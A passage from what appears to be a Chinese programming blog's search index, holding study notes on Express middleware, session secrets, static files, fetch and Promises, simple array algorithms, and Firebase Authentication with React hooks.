裡都會顯示目前時間，因為它的順序是這樣的： 顯示時間的 Middleware &gt; 顯示 todo 的 Middleware（todoContoller） 但有些時候我們可能只想把 Middleware 綁在特定的路由上，這時候就可以這樣寫： 12345678function localMiddleware (req, res, next) { console.log('now: ', new Date()); next();}// 只綁在這裡，當 localMiddleware 執行 next 後才會丟給 todoControllerapp.get('/todos', localMiddleware, todoController.getAll)// 這裡不會套用app.get('/todos/:id', todoController.get) 為什麼需要 Middleware前面介紹了這麼多，還沒講到一個重點，為什麼需要 Middleware？ 來舉個例子，如果我想要取得 request body 的內容的話怎麼辦？你可能很直覺的這樣寫： （假設是一個新增 todo 的 request） 123app.post('/todos', (req, res) =&gt; { console.log(req.body);}) 這樣的想法是正確的。但很抱歉，Express 預設的 Middleware 是沒有提供這個功能的，你必須透過另外一個 Middleware，讓它先處理好 request body 的部分後，才傳給你現在的 Middleware，大概會長這樣： 123456// 引入別人寫好的 middlewareconst bodyParser = require('body-parser');// 解析 Form 表單（application/x-www-form-urlencoded）app.use(bodyParser.urlencoded({ extended: true }));// 解析 JSONapp.use(bodyParser.json()); 剛有說過 app.use 會是被視為全域的 Middleware，所以接下來在其他的 Middleware 裡面都可以直接用 req.body.key 來拿內容。 剛剛是騙你的，其實在 4.0 以後 Express 有提供內建的 Middleware，所以不需要在下載 body-parser： 123// 改成 express.urlencoded 和 express.jsonapp.use(express.urlencoded({ extended: true }));app.use(express.json()); 順道一提，Express 內建的 middleware 有提供取得 query string 的功能： 123app.get('/'. (req, res, next) =&gt; { console.log(req.query); // {key: value}}) 其他注意事項 res.end 後不可以再呼叫 next()，因為 response 已經送出去了。 INSERT 指令會拿到的 result： 12345678910result: OkPacket { fieldCount: 0, affectedRows: 1, insertId: 4, serverStatus: 2, warningCount: 0, message: '', protocol41: true, changedRows: 0} 資訊蠻多的，但最常用的應該會是 affectedRows 和 insertId。 ejs 有分 = 和 - 的差別 = 會自動做文字跳脫，- 不會。 12&lt;%= '&lt;h1&gt;safe&lt;/h1&gt;' %&gt;&lt;%- '&lt;h1&gt;unsafe&lt;/h1&gt;' %&gt; 關於 flash 和 session 請務必記得這個順序： 12345678910const flash = require('connect-flash');const session = require('express-session');// session 先app.use(session({ secret: 'keyboard cat', resave: false, saveUninitialized: true,}))// 接著才可以用 flashapp.use(flash());","link":"/2022/03/25/express-middleware/"},{"title":"使用 Express 時的注意事項，還有一些地雷","text":"真的要注意啦。 next 的呼叫時機res.end 後不可以再呼叫 next()，因為 response 已經送出去了。 用 INSERT 指令會拿到的 result：12345678910result: OkPacket { fieldCount: 0, affectedRows: 1, insertId: 4, serverStatus: 2, warningCount: 0, message: '', protocol41: true, changedRows: 0} 資訊蠻多的，但最常用的應該會是 affectedRows 和 insertId。 ejs 有分 = 和 - 的差別= 會自動做文字跳脫，- 不會。 12&lt;%= '&lt;h1&gt;safe&lt;/h1&gt;' %&gt;&lt;%- '&lt;h1&gt;unsafe&lt;/h1&gt;' %&gt; 關於 flash 和 session請務必記得這個順序： 12345678910const flash = require('connect-flash');const session = require('express-session');// session 先app.use(session({ secret: 'keyboard cat', resave: false, saveUninitialized: true,}))// 接著才可以用 flashapp.use(flash()); 也不要為了測試而這樣寫： 123456789handleLogin: (req, res, next) =&gt; { const { username, password } = req.body; if (!username || !password) { req.flash('errorMessage', '請填滿所有欄位哦！'); // 這邊會把值覆寫掉，所以你怎麼讀都讀不到。 console.log(req.flash('errorMessage')); return next(); }}","link":"/2022/03/25/express-notice/"},{"title":"關於 Express 中的 session-secret","text":"怎麼都沒有人開門見山說一下這是啥。 簡述自從學 Express 就一直好奇這段 code 的意思： 12345app.use(session({ secret: 'keyboard cat', // &lt;- 這到底是什麼？ resave: false, saveUninitialized: true,})) 網路上找了很多文章都只寫一些像是： 用來認證該 Session 的資料 用于生成 session 的安全字符串 用于加密目标数据用的字符串 好，能看出它跟加密的東西似乎有點關係，但好像還是很抽象？ 好在 Huli 寫的 深入 Session 與 Cookie：Express、PHP 與 Rails 的實作 有提到 Express 是怎麼實作 session 的，這邊節錄幾個段落： 那這個 sessionID 是以什麼樣的形式存進 Cookie 的呢？ 12345678910111213141516171819202122232425262728293031var cookie = require('cookie')var signature = require('cookie-signature')// get the session cookie namevar name = opts.name || opts.key || 'connect.sid'// get the cookie signing secretvar secret = opts.secretif (secret &amp;&amp; !Array.isArray(secret)) { secret = [secret];}// set-cookieonHeaders(res, function(){ // set cookie setcookie(res, name, req.sessionID, secrets[0], req.session.cookie.data);});function setcookie(res, name, val, secret, options) { var signed = 's:' + signature.sign(val, secret); var data = cookie.serialize(name, signed, options); debug('set-cookie %s', data); var prev = res.getHeader('Set-Cookie') || [] var header = Array.isArray(prev) ? prev.concat(data) : [prev, data]; res.setHeader('Set-Cookie', header)} 內容的部分比較特別一點，會以 s: 開頭，後面接上 signature.sign(sessionID, secret) 的結果。 把重點放在 function setcookie(res, name, val, secret, options) { ... }，其實答案就出來了。 簡單來說 cookie 最後的值會是 s:加上 signature.sign(val, secret) 產生的一段字串（也就是所謂的鑑別碼）。從這裡能看到 secret 會被丟到 function 裡面做了某些事以後產生一個鑑別碼，既然如此 secret 的用途就很直白了。 secret 就是產生鑑別碼時會一起放進去的自定義字串（或想成是雜湊前要先加鹽的概念） 就是這麼簡單。 所以很多人要你用「環境變數」來設定 secret 就是這個原因。","link":"/2022/04/03/express-session-secret/"},{"title":"Express 設定靜態檔案的方式","text":"一點也不好玩的路徑遊戲。 懶人包最常見的用法就這兩個： 123// 兩個的意思是一樣的，但 path 的用法要記得先引入模組app.use(express.static(__dirname + '/public'));app.use(express.static(path.join(__dirname, 'public'))) 至於這到底是什麼意思？想知道的話就看下去。 用途解釋簡單來說，express.static 是用來設定「靜態檔案的位置」： 1express.static(root, [options]) 當我設定 express.static(__dirname + '/public') 的意思是說，當網址是 /hello 時，就去 /hello/public 底下去找；如果是 /hello/abc，就到 /hello/abc/public，以此類推。 但要特別注意在引入 CSS 時要用絕對路徑，是 /css/style.css 不是 css/style.css，後面用的是「相對路徑」，這樣就會抓不到檔案，總之要分清楚這兩個的差別。（還是不太懂的話就參考 這篇） 不過會發現另一個問題，當想在瀏覽器讀取時，不是用 /public/css/style.css 來存取，而是用 /css/style.css 的方式。 如果希望指定一個路徑，要這樣設定： 1app.use('/static', express.static(__dirname + '/public')); 這樣就可以用 /static/css/style.css 來存取。","link":"/2022/03/31/express-static/"},{"title":"從 fetch 來認識 Promise","text":"Promise 最核心的地方就放在這篇了。 fetch 回傳的是一個 Promise1234const url = 'https://api.com';const res = fetch(url);// Promise 物件console.log(res) 這就跟 $('.btn') 會回傳 jQuery 物件，new Date() 會回傳 Date 物件，/yo/ 會回傳 RegExp 物件是一樣的道理。fetch 也會回傳一個物件，這個物件就叫做 Promise。 但要注意並不是只有 fetch 才會回傳 Promise，fetch 只是其中之一而已。 例如以下回傳的也是 Promise： 1234// 讀取存在剪貼簿的值（Ctrl+C）navigator.clipboard.readText().then(text =&gt; { console.log(text)}); 怎麼從 Promise 物件拿到結果要用 Promise 提供的 .then 方法來取得，裡面傳的是一個 callback function： 12345const url = 'https://api.com';fetch(url) .then(function (data) { console.log(data); }); 結果大概長這樣： 123456789Response { type: 'cors', url: 'https://run.mocky.io/v3/ec9680e0-f534-40a1-bbc4-5ef69fd61cc6', redirected: false, status: 200, ok: true, body: (...) bodyUsed: false headers: Headers {}} 這時候就會很疑惑「居然沒辦法看到 body？」，這是因為從 then 裡面拿到的東西也是一個物件，我不確定它實際上叫做什麼，但總之先叫它 Response 吧。 如果要看到 body 的內容的話得用 Response 物件提供的方法，最常見的有兩種： response.text() response.json() 結果這樣寫之後又會發現：「靠腰，怎麼又是 Promise」 12345fetch(url) .then(function (response) { // Promise 物件 console.log(response.text()); }); 沒錯，這就是 Promise 的套路，通常在 Promise 裡會再回傳另一個新的 Promise。 但是不用想太複雜，這個就跟 jQuery 可以一直 $(.btn).find('.aa').css() 的道理有點像。為什麼可以一直這樣 . 下去？因為每一次的回傳值都是 jQuery 物件。 所以如果要再從 Promise 裡面拿到結果，就要再用 then 來拿： 12345fetch(url) .then((response) =&gt; { // 這邊就真的拿的到 body 了 response.text().then(body =&gt; console.log(body)); }); 為什麼可以 then 再接 then因為 then 這個方法回傳的也是一個 Promise… 而且在 then 裡面「回傳的東西」會是「下一個 then 裡面會拿到的值」。這一段很重要，所以麻煩記起來，拜託拜託。 以上面的例子來示範： 12345678910111213141516171819fetch(api500) .then((response) =&gt; { response.json() .then(body =&gt; { console.log(body); // 在這回傳東西 return '123'; }) // 這邊就能拿到剛剛回傳的東西 .then(fromFirst =&gt; { // 123 console.log(fromFirst); // 這邊不回傳東西 }) .then(fromSecond =&gt; { // 拿到預設回傳的 undefined console.log(fromSecond) }) }); 再來是另外一個重點，如果在 then 裡回傳的也是 Promise，那下一個 then 拿到的會是Promise 解析後（做完 then 後）的值 一樣示範一次： 12345678910fetch(url) .then(response =&gt; { // response.json() =&gt; Promise return response.json(); }) .then(json =&gt; { // 這裡拿到的值等於： // response.json().then(json =&gt; json) console.log(json) }); 這個就是 Promise 最大的優勢了，為什麼？你比較看看這兩段程式碼： 12345678910111213141516// 第一個fetch(url) .then(response =&gt; { response.json() .then(json =&gt; { console.log(json); }); });// 第二個fetch(url) .then(response =&gt; { return response.json(); }) .then(json =&gt; { console.log(json); }) 第一個寫法根本就是 callback hell，但第二個寫法就改善這問題了，因為它把層數壓低了。 可是為什麼能這樣子？原理就是剛剛講的，如果在 then 裡面回傳 Promise 的話，下一個 then 就會拿到解析後的結果。 這點還蠻有趣的，網路上確實只會教你第二種寫法，但很少人告訴過你為什麼可以這樣子。總之，相信現在你應該能理解了。 來做個總結複習一下 Promise 的幾個特性： 要拿到 Promise 的結果要用 then then 本身會回傳 Promise，所以可以一直 then 下去 then 裡面回傳什麼，下個 then 就會拿到什麼 如果 then 裡回傳的也是 Promise，下個 then 拿到的就會是 Promise 解析後的值","link":"/2022/03/03/fetch-and-promise/"},{"title":"fetch 處理錯誤的方式","text":"錯誤處理也很重要。 簡述當 axios 用習慣了以後再回來碰 fetch 時，常常會忘記 fetch 本身的一些性質，所以這篇想特別記錄一下使用 fetch 時要注意的幾件事情。 先來看一個簡單的範例： 12345678const url400 = 'https://run.mocky.io/v3/20740358-1de6-4d0e-a62c-93ca279079ca'function example1() { fetch(url400) .then((response) =&gt; response.json()) .then((data) =&gt; console.log('success', data)) .catch((error) =&gt; console.log('error', error))} 附註：這邊的 url400 是用 mocky 來產生的，有興趣的話可以自己到網站中建立一個 API 來測試。 這個範例是去打一個會拿到 status: 400 的 API，並且會回傳底下訊息： 123{ \"errorMessage\": \"parameter invalid\"} 接下來要問你一個問題： 既然會拿到 400，那最後會執行的應該是 catch((error) =&gt; console.log('error', error)) 這段對吧？ 先自己想想看，想好後再往下滑。 – 防雷線 –– 防雷線 –– 防雷線 –– 防雷線 –– 防雷線 –– 防雷線 –– 防雷線 –– 防雷線 –– 防雷線 – 答案是：不會，一樣會執行 .then() 的部分。 這是 fetch 比較特別的地方，就是對它而言： 除非是遇到網路錯誤（server 沒辦法回傳 response），否則這個 Promise 一律會被 resolve 除非是遇到網路錯誤（server 沒辦法回傳 response），否則這個 Promise 一律會被 resolve 除非是遇到網路錯誤（server 沒辦法回傳 response），否則這個 Promise 一律會被 resolve 也就是說不管是 400、401 或甚至是 500，這個 Promise 最後都還是會 resolve，所以會被執行的依然是 .then 而不是 .catch。 正確的處理方式所以拿剛剛的例子來說，如果我希望對 status 不是 200 的時候做錯誤處理的話，要在 .then 裡面做判斷： 123456789101112131415function example2() { fetch(url400) .then(async (response) =&gt; { // ok = false 代表 status 不在 200 ~ 299 之間 // reference: https://developer.mozilla.org/en-US/docs/Web/API/Response/ok if (!response.ok) { // 強制回傳一個 reject 的 promise return Promise.reject(await response.json()) } // 順利的話直接用 json 解析並回傳 return response.json() }) .then((data) =&gt; console.log('success', data)) .catch((error) =&gt; console.log('error', error))} 這樣子就可以正確的進入 .catch 並拿到錯誤訊息了：","link":"/2022/03/03/fetch-handle-error/"},{"title":"fetch 發 post 的方式","text":"懶人包。 簡述只是介紹一下該怎麼寫參數： 傳送 JSON 格式 123456789101112fetch(url, { // HTTP method method: 'POST', // 資料 body: JSON.stringify(json), headers: { // 資料傳什麼這邊就寫什麼 'Content-type': 'application/json; charset=UTF-8', }}).then(res =&gt; console.log(res)).catch(err =&gt; console.log(err)) 傳送 Form 表單（formData） 這個就跟 XHR 一樣，不要再設定 Content-type 了，不然格式會跑掉。 1234567891011const formData = new FormData();formData.append('name', 'PeaNu');formData.append('age', '22');formData.append('gender', 'man');fetch(url, { method: 'POST', body: formData,}).then(res =&gt; console.log(res)).catch(err =&gt; console.log(err)) 傳送 Form 表單（一般的表單） 12345678910fetch(api200, { method: 'POST', body: 'name=peanu&amp;age=20&amp;gender=man', headers: { // 記得加這行 'Content-type': 'application/x-www-form-urlencoded' }}).then(res =&gt; console.log(res)).catch(err =&gt; console.log(err))","link":"/2022/03/03/fetch-post/"},{"title":"fetch 的注意事項","text":"懶人包。 簡述Content-type你傳什麼資料就應該寫什麼格式： Json =&gt; application/json Form =&gt; application/x-www-form-urlencoded FormData =&gt; 雖然是 multipart/form-data 但不需要寫 Credential簡單來說就是「發 request 時要不要帶上 Cookie」，預設是「不會」，如果想要的話得加上這段設定： 12345678fetch(url, { // cros credentials: 'include' // 同源才帶 credentials: 'same-origin', // 保證不帶 credentials: 'omit'}) Mode最常被人誤解的東西，所以特別強調一下： 這不是用來破除 CROS 的限制 這不是用來破除 CROS 的限制 這不是用來破除 CROS 的限制 他的目的是告訴瀏覽器： 對，我知道 server 沒有開 CROS，但我本來就沒有想拿到 response，所以你不要讓程式跑到 catch 那邊。 所以說如果這樣設定： 12345678910fetch(lidemy, { method: 'POST', body: 'name=peanu&amp;age=20&amp;gender=man', headers: { 'Content-type': 'application/x-www-form-urlencoded' }, mode: \"no-cors\"}).then(res =&gt; console.log(res)).catch(err =&gt; console.log(err)) 就會成功拿到 response，不過是「透明的」： 12345678Response { type: 'opaque', url: '', redirected: false, status: 0, ok: false, // ...}","link":"/2022/03/03/fetch-tips/"},{"title":"費式數列","text":"好像寫程式都一定會實作的數列。 遞迴法遞迴的意思就是 在一個 function 裡面呼叫自己，而費式數列的規律正好是這種特性： 123456789101112fib(0) = 0fib(1) = 1fib(2) = fib(0) + fib(1) = 1fib(3) = fib(1) + fib(2) = 2fib(4) = fib(2) + fib(3) = 3fib(5) = fib(3) + fib(4) = 5fib(6) = fib(4) + fib(5) = 8fib(7) = fib(5) + fib(6) = 13fib(8) = fib(6) + fib(7) = 21fib(9) = fib(7) + fib(8) = 34fib(10) = fib(8) + fib(9) = 55... 所以除了 fib(0) 跟 fib(1) 之外，如果想取出數列中的第 n 個值，就可以用 fib(n) = fib(n-2) + fib(n-1) 的方式來取得，所以用遞迴的方式來寫的話就會這樣： 123456function fib(n) { if(n === 0) return 0 if(n === 1) return 1 return fib(n-2) + fib(n-1)}fib(10) // 55 用這種方式實作的時間複雜度大約會是 「O(2^n)（實際上是 O(1.6^n) 左右）」 。 意思是指每當 n 增加 1，執行的步驟就會增加 2 倍： 1234n = 1 =&gt; 2n = 2 =&gt; 4n = 3 =&gt; 8... 也就是說如果要求出 f(100) 的值，大概就會需要 2^100 次步驟。如果你把拿上面的程式碼去跑跑看，大概會直接當機 ( ºωº ) 想知道詳細的步驟可以參考 這篇文章。 所以從上面你可以知道，用遞迴來求費式數列並不是一個好做法。 以空間換取時間遞迴法最大的問題在於「重複計算」，例如說在求 fib(5) 的時候是像這樣子： fib(0) 總共被呼叫了 3 次 fib(1) 總共被呼叫了 5 次 fib(2) 總共被呼叫了 3 次 fib(3) 總共被呼叫了 2 次 與其這樣每次都重複呼叫，不如「把每個值都寫在一張表上」，等需要知道值的時候再去查表就好了。 所以可以建立一個 array 來儲存數列中的每個值。當想要搜尋數列裡第 n 個值的時候，就先把 0 ~ n 的這個數列表建立出來，接著在直接查表就可以了： 1234567891011121314151617function fib(n) { // 儲存數列的陣列 // 一開始先填入 0 跟 1 這兩個初始值 let sequence = [0, 1] // 當 n &gt; 1 的時候就去更新陣列中的數列 for(let i=2; i&lt;=n; i++) { // i=2，去從陣列中找出 sequence[0] 跟 sequence[1] 的值做相加， // 接著把計算後的值儲存到 sequence[2] 裡面 // i=3，去從陣列中找出 sequence[2] 跟 sequence[1] 的值做相加， // 接著把計算後的值儲存到 sequence[3] 裡面 // ... sequence[i] = sequence[i-2] + sequence[i-1] } // 去陣列裡面查第 n 個數列的值 return sequence[n]}fib(10) 用這種方式做出來的時間複雜度會是 O(n)，意思是 n 的值就是步驟的次數。 所以現在如果要求 fib(100) 也只需要 100 次步驟，保證你的電腦不會再當機惹。","link":"/2021/12/30/fibonacci-sequence/"},{"title":"找出第 n 個最小值","text":"來自 JS101 的練習題，覺得邏輯還蠻神奇的，所以想記下來。 把每一次都當作第一次其實一般直覺會想到的方法應該是： 把數列排序 =&gt; 由小到大 用 n 去從已經排序好的數列裡查值 所以用作弊一點的方法的話會是這樣子： 123456789function findNthMin(arr, n) { // 重新排序 =&gt; 由小到大 const sortedArray = arr.sort((a, b) =&gt; a-b) // array 從 0 開始，所以才要 -1 return sortedArray[n-1]}console.log(findNthMin([1, 2, 3, 4, 5], 2)) // 2console.log(findNthMin([1, 3, 5, 7, 9], 3)) // 5console.log(findNthMin([1, 1, 1, 1, 1], 2)) // 1 但這不是這篇文章想介紹的，想介紹的是另外一種思維： 從數列中找出最小值 把最小值從數列中刪除 重複步驟 1、2，直到重複 n 次為止 所以其實每一次都只是在找最小值，但重點在於 每一次都會把最小值移除 這個動作，這個動作會讓你下一次找到的其實是 次小值，接著是 次次小值，以此類推。 所以當你做了 n 次後，那一次的最小值就等同於第 n 個最小值了，挺神奇的吧？馬上來實作看看： 123456789101112131415161718192021222324252627function findNthMin(arr, n) { // 儲存第 n 個最小值 let min = null // 重複找最小值 n 次 for(let i=0; i&lt;n; i++) { // 每一次都重新設值為無線大 min = Infinity // 儲存最小值的位置 let k = null // 遍歷陣列，找出最小值 for(let j=0; j&lt;arr.length; j++) { if(arr[j] &lt; min) { // 更新最小值 min = arr[j] // 更新最小值的位置 k = j } } // 刪除最小值 arr.splice(k, 1) } // 回傳結果 return min}console.log(findNthMin([1, 2, 3, 4, 5], 2)) // 2console.log(findNthMin([1, 3, 5, 7, 9], 3)) // 5console.log(findNthMin([1, 1, 1, 1, 1], 2)) // 1 雖然這解法比較複雜一點，但是還蠻有趣的！ 用在排序上這個方法其實也能用來做排序，參考下面的原始碼： 123456789101112131415161718192021222324252627282930313233343536function sort(arr) { // 儲存最小值 let min = null // 儲存排序好的結果 const result = [] // 記得儲存陣列長度（因為更新陣列時 length 值會改變） // i=0 =&gt; arr.length=5 // i=1 =&gt; arr.length=4 // i=2 =&gt; arr.length=3 // i=3 =&gt; arr.length=2 // 迴圈就結束了，總共只跑 3 圈，所以只會得到 [1, 2, 3] const total = arr.length // 重新排序 for(let i=0; i&lt;total; i++) { // 每一次都重置為無限大 min = Infinity // 儲存最小值的位置 let k = null // 遍歷陣列，找出最小值 for(let j=0; j&lt;arr.length; j++) { if(arr[j] &lt; min) { // 更新最小值 min = arr[j] // 更新最小值的位置 k = j } } // 把最小值放到結果陣列裡 result[i] = min // 移除最小值 arr.splice(k, 1) } // 回傳第 n 個最小值 return result}console.log(sort([1, 2, 3, 4, 5])) 就跟原本的做法差不多，但要特別注意 length 值會改變這件事情，不要像我一樣忽略了。","link":"/2021/12/30/find-nth-min/"},{"title":"找出次大值","text":"原來是這樣子操作！ 程式碼123456789101112let arr = [5, 8, 6]let max = -Infinitylet max2 = -Infinityfor(let i=0; i&lt;arr.length; i++) { if (arr[i] &gt; max) { max2 = max max = arr[i] } else if (arr[i] &gt; max2) { max2 = arr[i] }}console.log(max, max2) 還記得曾經的人體編譯器嗎： 1234567891011121314151617181920211. 設 arr 為 [5, 8, 6]2. 設 max 為 -Infinity3. 設 max2 為 -Infinity4. 進入迴圈，i 從 0 跑到 25. i 現在是 06. 判斷 arr[0] &gt; max =&gt; (5 &gt; -Infinity) =&gt; 是7. 把 max2 設為 max =&gt; max2 = -Infinity8. 把 max 設為 arr[0] =&gt; max = 59. 下一圈迴圈10. i 現在是 111. 判斷 arr[1] &gt; max =&gt; (8 &gt; 5) =&gt; 是12. 把 max2 設為 max =&gt; max2 = 513. 把 max 設為 arr[1] =&gt; max = 814. 下一圈迴圈15. i 現在是 216. 判斷 arr[2] &gt; max =&gt; (6 &gt; 8) =&gt; 不是17. 判斷 arr[2] &gt; max2 =&gt; (6 &gt; 5) =&gt; 是11. 把 max2 設為 arr[2] =&gt; max2 = 618. 下一圈迴圈19. i 現在是 3，不符合條件，結束迴圈20. 印出 max, max2 =&gt; 8, 6 解說其實這一題的眉角在於「多用了一個變數來儲存次大值」。 每當 max 碰到比自己大的數字時，max2 會先把 max 的值給儲存起來，接著才把 max 的值給更新。 不過要特別注意的一個情況是：「arr[i] 沒有比 max 大，但卻比 max2 大」的情況，所以這個部分也要再多做一層判斷，才不會漏掉這個可能性。","link":"/2021/12/21/find-second-max/"},{"title":"Firebase－Authentication","text":"很強大的功能。 簡述在 Firebase 基礎 中已經介紹過怎麼使用 Firebase 的 firestore 服務，這篇要來介紹 Authentication，也就是跟登入相關的功能。 附註：這邊一樣會用 firebase@8.2 來舉例，所以記得裝對版本。 題外話寫完這篇後我才體會什麼叫做 SDK？其實這篇用到的登入登出 method 都是先經過 Firebase 包裝成 SDK 後，我們才可以用很簡單的一個 function 來完成的。 如果沒有被包裝成 SDK 的話，我們可能就要自己用 fetch 或是 XMLHttpRequest 之類的來自己處理，不會這麼輕鬆。 會寫這段只是因為我以前有做一個 筆記，當時還沒有很能體會 SDK 跟 API 到底實際差在哪，但現在突然被打通了，感覺還蠻神奇的。 後端的部分Firebase 的專案建好後，回到主控台會看到側邊欄有一個「Authentication」的選項，點進去後再選取「get start」就會看到這個畫面： 這邊是讓你選你要啟用哪種登入方式，這邊會用「電子郵件」來做舉例，所以就點選後把他啟用。 前端的部分就和設定 firestore 的方式差不多，只是多了一個 auth 的部分而已： 123456789101112131415161718192021import firebase from 'firebase/app'import 'firebase/firestore'import 'firebase/auth'const firebaseConfig = { apiKey: '...', authDomain: '...', projectId: '...', storageBucket: '...', messagingSenderId: '...', appId: '...'}// init firebasefirebase.initializeApp(firebaseConfig)// init servicesconst db = firebase.firestore()const auth = firebase.auth()export { db, auth } 關於 Firebase 的驗證原理這邊只是想做個補充，Firebase 的驗證機制是透過 JWT 來實作的。當使用者登入成功時 Firebase 會產生一個 JWT，接著我們只要在接下來的 request 中都帶上 JWT 就可以達到驗證機制了。 如果你對 JWT 有點好奇的話，推薦參考我寫的這篇：關於 JWT（JSON-Web-Token），裡面有解釋 JWT 是怎麼產生的。 註冊功能這邊先介紹透過「email」來註冊的流程，會以 custom hook 的方式來撰寫。 先來看段 code 再解釋： 12345678910111213141516171819202122232425import { useState } from 'react'import { auth } from 'firebase/config'export function useSignup() { const [isPending, setIsPending] = useState(false) const [error, setError] = useState(null) const signup = async (email, password, displayName) =&gt; { setIsPending(true) setError(null) try { const response = await auth.createUserWithEmailAndPassword(email, password) if (!response.user) throw new Error('Signup failed.') // update profile await response.user.updateProfile({ displayName }) setIsPending(false) } catch (error) { setError(error.message) setIsPending(false) } } return { error, isPending, signup }} 簡單來說有兩個流程： 用 createUserWithEmailAndPassword 來建立基本資料 用 updateProfile 來更新 displayName 因為這兩個東西是拆成兩個 API 來做的，所以才要分兩個動作。 總之，在成功建立以後你可以到 Firebase 的主控台來確認： 如果要刪除也是從這邊刪，把它當作資料庫就行了。 加上使用者頭像的功能這邊只是當作補充的懶人包： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import { useEffect, useState } from 'react'import { auth, storage } from 'firebase/config'import { useAuthContext } from './useAuthContext'export function useSignup() { const [isPending, setIsPending] = useState(false) const [isCancelled, setIsCancelled] = useState(false) const [error, setError] = useState(null) const { dispatch } = useAuthContext() const signup = async (email, password, displayName, thumbnail) =&gt; { setIsPending(true) setError(null) try { // create user const response = await auth.createUserWithEmailAndPassword(email, password) if (!response.user) throw new Error('Signup failed.') // upload thumbnail const uploadPath = `thumbnail/${response.user.uid}/${thumbnail.name}` const img = await storage.ref(uploadPath).put(thumbnail) const imgUrl = await img.ref.getDownloadURL() // update profile await response.user.updateProfile({ displayName, photoURL: imgUrl }) // update global state dispatch({ type: 'LOGIN', payload: response.user }) // update state if (!isCancelled) { setIsPending(false) } } catch (error) { if (!isCancelled) { setError(error.message) setIsPending(false) } } } useEffect(() =&gt; { return () =&gt; setIsCancelled(true) }, []) return { error, isPending, signup }} 簡單來說就是： 設定要上傳的路徑：/thumbnail/${使用者uid}/${檔案名稱} 用把圖片上傳到 storage：await img.ref.getDownloadURL() 用圖片的 reference 取得 URL：await img.ref.getDownloadURL() 最後把 URL 寫入 Profile 中就行了 登出其實關鍵只有一行而已，不過這邊一樣寫成 hook 的形式： 12345678910111213141516171819202122import { auth } from 'firebase/config'import { useState } from 'react'import { useAuthContext } from './useAuthContext'export const useLogout = () =&gt; { const { dispatch } = useAuthContext() const [isPending, setIsPending] = useState(false) const [error, setError] = useState(null) const logout = async () =&gt; { setIsPending(true) setError(null) try { // 登出的 API await auth.signOut() dispatch({ type: 'LOGOUT' }) } catch (error) { setError(error.message) setIsPending(false) } } return { logout, isPending, error }} 登入一樣關鍵的地方只有一行，這邊用 hook 來表示： 1234567891011121314151617181920212223242526272829303132333435import { auth } from 'firebase/config'import { useEffect, useState } from 'react'import { useAuthContext } from './useAuthContext'export const useLogIn = () =&gt; { const { dispatch } = useAuthContext() const [isPending, setIsPending] = useState(false) const [isCanceled, setIsCanceled] = useState(false) const [error, setError] = useState(null) const login = async (eamil, password) =&gt; { setIsPending(true) setError(null) try { // 登入（帶入 email 和 password） const response = await auth.signInWithEmailAndPassword(eamil, password) dispatch({ type: 'LOGIN', payload: response.user }) if (!isCanceled) { setIsPending(false) } } catch (error) { if (!isCanceled) { setError(error.message) setIsPending(false) } } } useEffect(() =&gt; { return () =&gt; setIsCanceled(true) }, []) return { login, isPending, error }} 登入與登出的 Clean function附註：雖然新的 React 好像有對這個做修正，所以就算不這樣做也沒關係，但我覺得最好還是暸解一下這個觀念比較好。 這只是用來避免下面這種情形： 我登入時畫面還在 loadnig，但我直接點去別的頁面 我登出時畫面還在 loading，但我馬上點去別的頁面 這兩種情形都會引發「明明元件已經被撤銷了，但我還試著要去更新 state 的情形（loading 狀態）」，所以這邊一樣要透過 clean function 來做一些事情。 在 React－這個 fetch 我剛剛要但現在又不要了 中有介紹過怎麼取消 fetch，但我們現在是用 Firebase 提供的 API 來實作，那該怎麼辦才好？ 技術上來說我們沒有辦法真的「取消 request」這件事，不過我們可以控制「在 xxx 條件下才准許更新 state」，這也就是這邊的做法，直接來看 code： 123456789101112131415161718192021222324252627282930313233343536import { auth } from 'firebase/config'import { useEffect, useState } from 'react'import { useAuthContext } from './useAuthContext'export const useLogout = () =&gt; { const { dispatch } = useAuthContext() const [isPending, setIsPending] = useState(false) const [isCanceled, setIsCanceled] = useState(false) const [error, setError] = useState(null) const logout = async () =&gt; { setIsPending(true) setError(null) try { await auth.signOut() dispatch({ type: 'LOGOUT' }) // 如果沒有被取消才更新 state if (!isCanceled) { setIsPending(false) } } catch (error) { // 如果沒有被取消才更新 state if (!isCanceled) { setError(error.message) setIsPending(false) } } } useEffect(() =&gt; { // 更新 flag return () =&gt; setIsCanceled(true) }, []) return { logout, isPending, error }} 改寫成這樣後，就算這個元件被撤銷了也不會再去更新 state，因為當下的條件不成立（isCanceled = true）。 不過這邊你可能會一個疑問是 dispatch 不用放進去判斷嗎？這不是也會更新 state？ 記得我一開始說的嗎？我說過我們沒有辦法真的去「取消 request」，也就是說實際上還是把「登出」的 API 給打出去了，所以最後還是會完成「登出」這個動作。 如果這時候我又放進去判斷的話，那就會導致「畫面上顯示已登入，但後端那邊實際上是已登出」的問題，所以才不可以這樣做。 雖然還有另外一個原因是因為 dispatch 更新的 state 是 global 的，所以就算這個元件被撤銷了也沒關係，畢竟有可能會有其他的元件會需要用到它。 登入狀態初始化前面已經介紹「註冊、登入、登出」這三個功能，接著要介紹的是初始化。 我們在一開始載入頁面時瀏覽器並不會使用者有沒有登入，所以一定是打一隻 API 去問說「使用者現在登入了嗎？」才會知道結果，因此這個動作就是「初始化」。 關於初始化的 API，我原本知道的作法是用 LocalStorage 中的 JWT 去打，但這邊要介紹的是另外一種 Firebase 提供的方法：onAuthStateChanged。 簡單來說就是 Auth 版的即時資料，只要前後端某一方發生了登入、登出的行為就會立刻 trigger 這個 function，所以他寫起來就跟在抓 real-time-data 的方式很像： 1234567891011121314151617181920212223export const authReducer = (state, action) =&gt; { switch (action.type) { case 'INIT_USER': return { ...state, user: action.payload, isUserInit: true } default: return state }}useEffect(() =&gt; { // callback 會拿到 user 參數（null | object） const unsubscribe = auth.onAuthStateChanged((user) =&gt; { dispatch({ type: 'INIT_USER', payload: user }) unsubscribe() })}, []) 這邊做的事情有兩個： 去看目前 user 的登入狀態，如果有人登入就會拿到那包 Object，沒有的話就會是 null。 接著用 dispatch 來更新 user 的資料，並且把 isInitUser 設定為已完成。 最後是 unsubscribe，因為我希望這個動作只需要「做一次」就夠了，不需要每次 user 狀態更新時都執行一遍，所以在做完初始化以後就立刻「取消追蹤」。 順道一提，isInitUser 這個 state 是用來處理第一次載入時畫面會「閃一下」的問題。反正就是為了提升 UX 用的 state，你可以在 isInitUser = false 時先顯示載入畫面 or 